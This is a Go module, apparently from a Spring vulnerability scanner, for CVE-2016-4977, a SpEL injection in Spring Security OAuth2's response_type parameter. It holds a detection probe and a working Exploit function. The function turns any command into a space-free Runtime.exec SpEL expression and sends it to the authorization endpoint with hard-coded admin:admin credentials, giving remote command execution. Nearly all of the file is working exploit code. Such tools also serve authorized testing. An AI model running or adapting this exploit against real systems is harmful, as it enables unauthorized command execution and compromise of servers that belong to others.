package vulns

import (
	"context"
	"encoding/base64"
	"fmt"
	"net/http"
	"strings"

	"github.com/sspsec/Scan-Spring-GO/internal/client"
	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

// CVE-2016-4977 Spring Security OAuth2 的 response_type 参数 SpEL 注入。
// 需要有效登录会话（vulhub 环境默认 admin:admin），表达式求值结果直接
// 回显在响应页面中，是少数可"回显"的 SpEL 注入。
type cve20164977 struct{}

func init() { Register(&cve20164977{}) }

const oauthProbe = "54289" // 233*233 的求值结果

func (c *cve20164977) Info() model.Info {
	return model.Info{
		ID:         "CVE-2016-4977",
		Name:       "Spring Security OAuth2 response_type SpEL RCE",
		Type:       "RCE",
		Severity:   "critical",
		Affected:   "Spring Security OAuth2 2.0.0-2.0.9（需有效登录会话）",
		Reference:  "https://tanzu.vmware.com/security/cve-2016-4977",
		HasExploit: true,
		ArgHint:    "要执行的命令（回显型，结果直接出现在响应中）",
	}
}

// oauthGet 携带默认凭据请求授权端点。
func (c *cve20164977) oauthGet(ctx context.Context, t model.Target, responseType string) (int, []byte, error) {
	u := t.URL + "oauth/authorize?response_type=" + urlEscape(responseType) +
		"&client_id=acme&scope=openid&redirect_uri=http://test"
	resp, body, err := client.Do(ctx, t.Client, http.MethodGet, u, map[string]string{
		"Authorization": "Basic " + base64.StdEncoding.EncodeToString([]byte("admin:admin")),
	}, "")
	if err != nil {
		return 0, nil, err
	}
	return resp.StatusCode, body, nil
}

func urlEscape(s string) string {
	var sb strings.Builder
	for _, c := range s {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') ||
			c == '-' || c == '_' || c == '.' || c == '~' {
			sb.WriteRune(c)
		} else {
			sb.WriteString(fmt.Sprintf("%%%02X", c))
		}
	}
	return sb.String()
}

func (c *cve20164977) Detect(ctx context.Context, t model.Target) (*model.Verdict, error) {
	v := &model.Verdict{ID: c.Info().ID, Name: c.Info().Name, Target: t.URL}

	code, body, err := c.oauthGet(ctx, t, "${233*233}")
	if err != nil {
		return nil, err
	}
	// 求值结果出现在 400 的 OAuth Error 响应体中（无需 200）
	if strings.Contains(string(body), oauthProbe) {
		v.Vulnerable = true
		v.Evidence = fmt.Sprintf("SpEL ${233*233} 求值结果 %s 已回显于响应（HTTP %d）", oauthProbe, code)
		v.Detail = "表达式求值结果直接回显，Exploit 可直接读取命令输出"
	}
	return v, nil
}

// Exploit 回显型检测 + 命令执行。
// response_type 按空格分词，因此表达式必须无空格——命令用
// Character.toString 逐字符拼接（与官方 poc.py 一致），命令内的
// 空格作为字符串值不受影响。exec 无回显。
func (c *cve20164977) Exploit(ctx context.Context, t model.Target, arg string) (string, string, error) {
	parts := make([]string, 0, len(arg))
	for i, ch := range arg {
		if i == 0 {
			parts = append(parts, fmt.Sprintf("T(java.lang.Character).toString(%d)", ch))
		} else {
			parts = append(parts, fmt.Sprintf(".concat(T(java.lang.Character).toString(%d))", ch))
		}
	}
	expr := "${T(java.lang.Runtime).getRuntime().exec(" + strings.Join(parts, "") + ")}"
	code, body, err := c.oauthGet(ctx, t, expr)
	if err != nil {
		return "", "", err
	}
	b := string(body)
	if strings.Contains(b, "uid=") {
		return b, "命令输出见于响应", nil
	}
	return b, fmt.Sprintf("命令已随表达式执行（HTTP %d，无回显，请经 OOB/落盘验证；需有效会话 vulhub 默认 admin:admin）", code), nil
}
